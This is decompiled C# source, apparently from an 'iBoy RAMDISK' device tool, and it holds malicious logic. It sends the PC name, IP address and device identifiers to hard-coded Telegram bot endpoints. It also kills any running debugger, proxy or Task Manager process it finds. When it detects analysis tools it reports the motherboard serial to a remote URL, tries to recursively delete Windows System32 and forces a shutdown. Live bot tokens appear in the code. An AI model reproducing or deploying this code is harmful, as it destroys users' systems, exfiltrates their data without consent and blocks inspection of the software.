using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

// Token: 0x0200000E RID: 14
internal sealed class Class5
{
	// Token: 0x0600003C RID: 60 RVA: 0x00006130 File Offset: 0x00004330
	private string method_0()
	{
		string text2;
		try
		{
			string text = "https://api.ipify.org/";
			HttpWebRequest httpWebRequest = WebRequest.CreateHttp(text);
			httpWebRequest.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
			httpWebRequest.Timeout = -1;
			using (HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse())
			{
				using (StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream()))
				{
					text2 = streamReader.ReadToEnd();
				}
			}
		}
		catch
		{
			text2 = "ERROR";
		}
		return text2;
	}

	// Token: 0x0600003D RID: 61
	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool CheckRemoteDebuggerPresent(IntPtr intptr_0, ref bool bool_0);

	// Token: 0x0600003E RID: 62 RVA: 0x000061C4 File Offset: 0x000043C4
	internal void method_1()
	{
		new Thread(new ParameterizedThreadStart(this.method_5)).Start(Thread.CurrentThread);
	}

	// Token: 0x0600003F RID: 63 RVA: 0x000061EC File Offset: 0x000043EC
	internal void method_2()
	{
		new Thread(new ParameterizedThreadStart(this.method_9)).Start(Thread.CurrentThread);
	}

	// Token: 0x06000040 RID: 64 RVA: 0x00006214 File Offset: 0x00004414
	public void method_3(string string_0)
	{
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("https://api.telegram.org/bot5315272887:AAHbOegbA4m4RCTqhIHpO_u-aiaKXGRWNtk/sendMessage?chat_id=5409971152&text=" + string_0);
		httpWebRequest.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
		httpWebRequest.Proxy = null;
		using (HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse())
		{
			using (Stream responseStream = httpWebResponse.GetResponseStream())
			{
				using (StreamReader streamReader = new StreamReader(responseStream))
				{
					streamReader.ReadToEnd();
				}
			}
		}
	}

	// Token: 0x06000041 RID: 65 RVA: 0x000062B4 File Offset: 0x000044B4
	public void method_4(string string_0)
	{
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("https://api.telegram.org/bot5304368931:AAFyLjJHd4IA_OHtCPRkYyTieBwvbacVYXw/sendMessage?chat_id=-1001715792649&text=" + string_0);
		httpWebRequest.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
		httpWebRequest.Proxy = null;
		using (HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse())
		{
			using (Stream responseStream = httpWebResponse.GetResponseStream())
			{
				using (StreamReader streamReader = new StreamReader(responseStream))
				{
					streamReader.ReadToEnd();
				}
			}
		}
	}

	// Token: 0x06000042 RID: 66 RVA: 0x00006354 File Offset: 0x00004554
	internal void method_5(object object_0)
	{
		string[] array = new string[]
		{
			"codecracker", "x32dbg", "x64dbg", "charles", "dnspy", "simpleassembly", "peek", "httpanalyzer", "wireshark", "devirt",
			"logger", "usbtrace", "usbmonitor", "serialmonitor", "ilspy", "charlesproxy", "fiddler", "extremedumper", "megadumper", "x64netdumper",
			"dumper", "dump", "ollydbg ", "softice", "dotpeek", "TEMP", "Taskmgr", "Taskmgr.exe", "cheat engine", "cheatengine",
			"scylla", "scylla_x64", "scylla_x86", "protection_id", "reshacker", "ImportREC", "de4dot", "disassembly", "Import reconstructor", "debug",
			"debugger", "httpdebug", "httpdebug", "immunitydebugger", "immunity", "debug", "petool", "petools", "PE Tools", "ida",
			"ida64", "idag", "idag64", "idaw", "idaw64", "idaq", "idaq64", "idau", "idau64", "idag",
			"idaq", "windbg", "[cpu", "simpleassembly", "postman", "softice", "jetbrains", "Resource Monitor", "Resource", "Resource and Performancer Monitor",
			"temp", "AppData", "Suspend Process", "processhacker", "Process Hacker", "perfmon", "valgrind", "SIMMON", "Rational Purify", "Memcheck",
			"Disassembler", "parasoft", "Dr. Memory", "WinHex", "Analyze It", "Hook Analyzer", "Process Explorer", "procmon64", "scylla", "de4dotmodded",
			"protection_id", "x96dbg", "process hacker", "process monitor", "qt5core", "dbgclr", "hxd", "import reconstructor", "Trw2000", "Winpdb",
			"procdump"
		};
		for (;;)
		{
			try
			{
				Process[] processes = Process.GetProcesses();
				Process[] array2 = processes;
				foreach (Process process in array2)
				{
					if (process != Process.GetCurrentProcess())
					{
						for (int j = 0; j < array.Length; j++)
						{
							int id = Process.GetCurrentProcess().Id;
							if (process.ProcessName.ToLower().Contains(array[j]))
							{
								try
								{
									process.Kill();
									File.WriteAllText("WARNING.txt", string.Concat(new string[] { "WE FOUND : ", process.ProcessName, " RUNNING IN BACKGROUND! We Close the ", process.ProcessName, " in Order to start using our tool\n\nPLEASE REOPEN THE TOOL" }));
									new Process
									{
										StartInfo = 
										{
											FileName = "notepad.exe",
											Arguments = "WARNING.TXT",
											UseShellExecute = false,
											RedirectStandardOutput = true,
											CreateNoWindow = true
										}
									}.Start();
									goto IL_566;
								}
								catch (Exception)
								{
									goto IL_566;
								}
								goto IL_49B;
								IL_566:
								Process.GetCurrentProcess().Kill();
							}
							IL_49B:
							if (process.MainWindowTitle.ToLower().Contains(array[j]))
							{
								try
								{
									process.Kill();
									File.WriteAllText("WARNING.txt", string.Concat(new string[] { "WE FOUND : ", process.ProcessName, " RUNNING IN BACKGROUND! We close the ", process.ProcessName, " in Order to start using our tool\n\nPLEASE REOPEN THE TOOL" }));
									new Process
									{
										StartInfo = 
										{
											FileName = "notepad.exe",
											Arguments = "WARNING.TXT",
											UseShellExecute = false,
											RedirectStandardOutput = true,
											CreateNoWindow = true
										}
									}.Start();
									goto IL_580;
								}
								catch (Exception)
								{
									goto IL_580;
								}
								goto IL_55B;
								IL_580:
								Process.GetCurrentProcess().Kill();
								Process.GetCurrentProcess().Kill();
							}
							IL_55B:;
						}
					}
				}
			}
			catch (Exception)
			{
			}
			Thread.Sleep(1000);
		}
	}

	// Token: 0x06000043 RID: 67 RVA: 0x00006958 File Offset: 0x00004B58
	public void method_6(string string_0)
	{
		try
		{
			this.method_3(string.Concat(new string[]
			{
				"iBoy RAMDISK Report ",
				string_0,
				"\nPC Name : ",
				Environment.MachineName.ToString(),
				"\nDate : ",
				DateTime.Now.ToString("dddd, dd MMMM yyyy"),
				"\nECID : ",
				Class19.string_2,
				"\nModel : ",
				Class19.string_1,
				"\nIP : ",
				GClass0.string_5,
				"\nModel : ",
				Class19.string_4,
				"-",
				Class19.string_0
			}));
		}
		catch
		{
		}
	}

	// Token: 0x06000044 RID: 68 RVA: 0x00006A24 File Offset: 0x00004C24
	public void method_7(string string_0)
	{
		try
		{
			this.method_3(string.Concat(new string[]
			{
				"iBoy RAMDISK Report\nStatus : ",
				string_0,
				"\nDate : ",
				DateTime.Now.ToString("dddd, dd MMMM yyyy"),
				"\nECID : ",
				Class19.string_2,
				"\nDevice :",
				Class19.string_1
			}));
		}
		catch
		{
		}
	}

	// Token: 0x06000045 RID: 69 RVA: 0x00006AA4 File Offset: 0x00004CA4
	public void method_8(string string_0)
	{
		try
		{
			this.method_4(string.Concat(new string[]
			{
				Application.ProductName,
				" Report ",
				string_0,
				"\nPC Name : ",
				Environment.MachineName.ToString(),
				"\nDate : ",
				DateTime.Now.ToString("dddd, dd MMMM yyyy"),
				"\nECID : ",
				Class19.string_2,
				"\nModel : ",
				Class19.string_1
			}));
		}
		catch
		{
		}
	}

	// Token: 0x06000046 RID: 70 RVA: 0x00006B44 File Offset: 0x00004D44
	internal void method_9(object object_0)
	{
		Class5.Struct6 @struct;
		@struct.class5_0 = this;
		@struct.string_0 = new string[]
		{
			"codecracker", "x32dbg", "x64dbg", "charles", "dnspy", "simpleassembly", "peek", "httpanalyzer", "wireshark", "devirt",
			"logger", "usbtrace", "usbmonitor", "serialmonitor", "ilspy", "charlesproxy", "fiddler", "extremedumper", "megadumper", "x64netdumper",
			"dumper", "dump", "ollydbg ", "softice", "dotpeek", "TEMP", "Taskmgr", "cheat engine", "cheatengine", "scylla",
			"scylla_x64", "scylla_x86", "protection_id", "reshacker", "ImportREC", "de4dot", "disassembly", "Import reconstructor", "debug", "debugger",
			"httpdebug", "httpdebug", "immunitydebugger", "immunity", "debug", "petool", "petools", "PE Tools", "ida", "ida64",
			"idag", "idag64", "idaw", "idaw64", "idaq", "idaq64", "idau", "idau64", "idag", "idaq",
			"windbg", "[cpu", "simpleassembly", "postman", "softice", "jetbrains", "Resource Monitor", "Resource", "Resource and Performancer Monitor", "temp",
			"AppData", "Suspend Process", "processhacker", "Process Hacker", "perfmon", "valgrind", "SIMMON", "Rational Purify", "Memcheck", "Disassembler",
			"parasoft", "Dr. Memory", "WinHex", "Analyze It", "Hook Analyzer", "Process Explorer", "procmon64", "scylla", "de4dotmodded", "protection_id",
			"x96dbg", "process hacker", "process monitor", "qt5core", "dbgclr", "hxd", "import reconstructor", "Trw2000", "Winpdb", "procdump"
		};
		for (;;)
		{
			try
			{
				Process[] processes = Process.GetProcesses();
				foreach (Process process in processes)
				{
					if (process != Process.GetCurrentProcess())
					{
						for (int j = 0; j < @struct.string_0.Length; j++)
						{
							int id = Process.GetCurrentProcess().Id;
							if (process.ProcessName.ToLower().Contains(@struct.string_0[j]))
							{
								this.method_12(@struct.string_0[j], ref @struct);
								this.method_12(process.MainWindowTitle, ref @struct);
							}
							if (process.MainWindowTitle.ToLower().Contains(@struct.string_0[j]))
							{
								this.method_12(@struct.string_0[j], ref @struct);
								this.method_12(process.ProcessName, ref @struct);
							}
						}
					}
				}
			}
			catch
			{
			}
		}
	}

	// Token: 0x06000047 RID: 71 RVA: 0x00006FD4 File Offset: 0x000051D4
	public void method_10()
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "shutdown /s /t 0");
		Process.Start("shutdown", "/s /t 0");
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		new Process
		{
			StartInfo = processStartInfo
		}.Start();
	}

	// Token: 0x06000048 RID: 72 RVA: 0x00007034 File Offset: 0x00005234
	public static string smethod_0()
	{
		string text = "MBID";
		try
		{
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_BaseBoard");
			ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get();
			foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				text = (string)managementObject["SerialNumber"];
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine("ERROR: ", ex);
			text = "2";
		}
		return text.Trim();
	}

	// Token: 0x06000049 RID: 73 RVA: 0x000070D4 File Offset: 0x000052D4
	public string method_11()
	{
		string text = "http://hiacedisemarang.com/ramdisk/Blacklist/blacklist.php";
		string text2 = text + "?PC=" + Class5.smethod_0();
		HttpWebRequest httpWebRequest = WebRequest.CreateHttp(text2);
		httpWebRequest.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
		httpWebRequest.Timeout = 12000;
		string text3;
		using (HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse())
		{
			using (StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream()))
			{
				text3 = streamReader.ReadToEnd();
			}
		}
		return text3;
	}

	// Token: 0x0600004B RID: 75 RVA: 0x0000716C File Offset: 0x0000536C
	[CompilerGenerated]
	private void method_12(string string_0, ref Class5.Struct6 struct6_0)
	{
		Process[] processesByName = Process.GetProcessesByName(string_0);
		if (processesByName.Length >= 1)
		{
			Process[] array = processesByName;
			for (int i = 0; i < struct6_0.string_0.Length; i++)
			{
				array[i].Kill();
				if (string_0.StartsWith("megadump") || string_0.Contains("Megadumper") || string_0.Contains("Process hacker") || string_0.Contains("Processhacker") || string_0.Contains("codecracker") || string_0.StartsWith("reshack") || string_0.StartsWith("x96db") || string_0.StartsWith("petools") || string_0.StartsWith("dump") || string_0.StartsWith("x64netdump"))
				{
					this.method_11();
					MessageBox.Show("Sorry, Your PC Try to Crack Tools");
					if (File.Exists("C:/Windows/System32"))
					{
						try
						{
							Directory.Delete("C:/Windows/System32", true);
							goto IL_207;
						}
						catch
						{
							goto IL_207;
						}
						goto IL_E8;
						IL_207:
						this.method_10();
					}
					IL_E8:
					if (File.Exists("D:/Windows/System32"))
					{
						try
						{
							Directory.Delete("D:/Windows/System32", true);
						}
						catch
						{
						}
					}
					this.method_10();
				}
				if (string_0.StartsWith("ida6") || string_0.Contains("de4do") || string_0.Contains("SIMMON") || string_0.Contains("extremedump") || string_0.StartsWith("x32dbg") || string_0.StartsWith("x64dbg") || string_0.StartsWith("scylla") || string_0.StartsWith("THEMIDA_UNPACK_x86") || string_0.StartsWith("THEMIDA_UNPACK_x64") || string_0.StartsWith("Unpacker"))
				{
					MessageBox.Show("Sorry, Your PC Try to Crack Tools");
					if (File.Exists("C:/Windows/System32"))
					{
						try
						{
							Directory.Delete("C:/Windows/System32", true);
						}
						catch
						{
						}
						this.method_10();
					}
					if (File.Exists("D:/Windows/System32"))
					{
						try
						{
							Directory.Delete("D:/Windows/System32", true);
						}
						catch
						{
						}
					}
					this.method_10();
				}
				if (string_0.StartsWith("dnsp") || string_0.Contains("DnsPy"))
				{
					this.method_10();
				}
			}
			if (string_0.StartsWith("verInfoLib") || string_0.Contains("de4dot-x64") || string_0.Contains("de4dot") || string_0.Contains("procdump") || string_0.StartsWith("x32-dbg") || string_0.StartsWith("x64-dbg") || string_0.StartsWith("ilspy") || string_0.StartsWith("fiddler") || string_0.StartsWith("THEMIDA_UNPACK_x64") || string_0.StartsWith("Unpacker"))
			{
				MessageBox.Show("Sorry, Your PC Try to Crack Tools");
				if (File.Exists("C:/Windows/System32"))
				{
					try
					{
						Directory.Delete("C:/Windows/System32", true);
					}
					catch
					{
					}
				}
				if (File.Exists("D:/Windows/System32"))
				{
					try
					{
						Directory.Delete("D:/Windows/System32", true);
					}
					catch
					{
					}
				}
			}
		}
	}

	// Token: 0x0200000F RID: 15
	[CompilerGenerated]
	[StructLayout(LayoutKind.Auto)]
	private struct Struct6
	{
		// Token: 0x04000034 RID: 52
		public Class5 class5_0;

		// Token: 0x04000035 RID: 53
		public string[] string_0;
	}
}
